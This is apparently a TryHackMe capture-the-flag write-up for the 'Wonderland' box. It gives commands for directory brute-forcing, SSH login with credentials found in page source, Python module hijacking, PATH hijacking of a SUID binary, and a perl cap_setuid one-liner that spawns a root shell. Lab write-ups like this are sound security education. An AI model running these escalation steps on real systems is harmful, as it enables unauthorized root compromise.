#  TryHackMe — Wonderland Writeup

<img width="989" height="279" alt="image" src="https://github.com/user-attachments/assets/bfa956d0-dddd-409c-9cfb-aa69c13c10a7" />


> **Full chain exploitation:** Web → Credential Discovery → Python Hijack → SUID Abuse → Capabilities → Root  
> Theme: *Alice in Wonderland*

---

##  Overview

This box demonstrates a **multi-stage privilege escalation chain**:

alice → rabbit → hatter → root

Key techniques used:
- Source code credential discovery  
- Python module hijacking  
- SUID PATH hijacking  
- Linux capability abuse  

---

##  Enumeration

### Port Scan
nmap -sC -sV <TARGET_IP>

**Results:** 
- 22/tcp — SSH  
- 80/tcp — HTTP  

---

##  Web Enumeration

### Directory Bruteforce

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
**Discovered paths:**
- /img  
- /r  
- /poem  

---

##  Manual Analysis

### /r/
Displayed:
"Which way I ought to go from here?"

```bash
gobuster dir -u http://<TARGET_IP>/r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster dir -u http://<TARGET_IP>/r/a -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster dir -u http://<TARGET_IP>/r/a/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster dir -u http://<TARGET_IP>/r/a/b/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster dir -u http://<TARGET_IP>/r/a/b/b/i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster dir -u http://<TARGET_IP>/r/a/b/b/i/t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1073" height="925" alt="image" src="https://github.com/user-attachments/assets/d96b4e99-2d41-4054-b314-758493802591" />


---

##  Credential Discovery

Viewing page source revealed hardcoded credentials.

<img width="1050" height="355" alt="image" src="https://github.com/user-attachments/assets/f1fd4f2b-afd0-4b1b-9011-39c0e80fbc5b" />

```bash
ssh alice@<TARGET_IP>
```

---

##  Privilege Escalation — Alice → Rabbit

### Check sudo privileges

```bash
sudo -l
```
Output:
```
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
---

###  Exploit: Python Module Hijacking

The script imports:
import random

 Python loads modules from the current directory first.

Create malicious module:
```bash
echo 'import os; os.system("/bin/bash")' > /home/alice/random.py
```

Execute as rabbit:
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

 Shell obtained as rabbit

---

##  Privilege Escalation — Rabbit → Hatter

### Find SUID binaries
```bash
find / -perm -4000 2>/dev/null
```

Found:
 /home/rabbit/teaParty

---

###  Exploit: PATH Hijacking

The binary calls external commands (e.g., date) without full path.

Create malicious binary:
```bash
echo '/bin/bash' > /tmp/date
chmod +x /tmp/date
```

Modify PATH:
```bash
export PATH=/tmp:$PATH
```
Execute binary:
```bash
/home/rabbit/teaParty
```
 Shell obtained as hatter

---

##  Privilege Escalation — Hatter → Root

### Check capabilities
```bash
getcap -r / 2>/dev/null
```

Output:
```
 /usr/bin/perl5.26.1 = cap_setuid+ep
 /usr/bin/perl = cap_setuid+ep
```

---

###  Exploit: Capability Abuse

```bash
/usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
 cap_setuid allows setting UID to root

---

##  Attack Flow

[Web]  
↓  
[Source Code Credentials]  
↓  
[alice]  
↓  
[Python Module Hijack]  
↓  
[rabbit]  
↓  
[SUID PATH Hijack]  
↓  
[hatter]  
↓  
[Capabilities Exploit]  
↓  
[root]  

---

##  Key Takeaways

- Manual inspection sometimes beats brute force  
- Python module hijacking is powerful when scripts import local modules  
- SUID binaries without full paths are vulnerable to PATH hijacking  
- Linux capabilities (cap_setuid) can allow direct root escalation  
- Always think in chained escalation paths  

---

##  Conclusion

This box is an example of chaining multiple real-world techniques together. Each step reinforces the importance of proper enumeration, understanding execution flow, and recognizing when small misconfigurations can lead to full system compromise. 
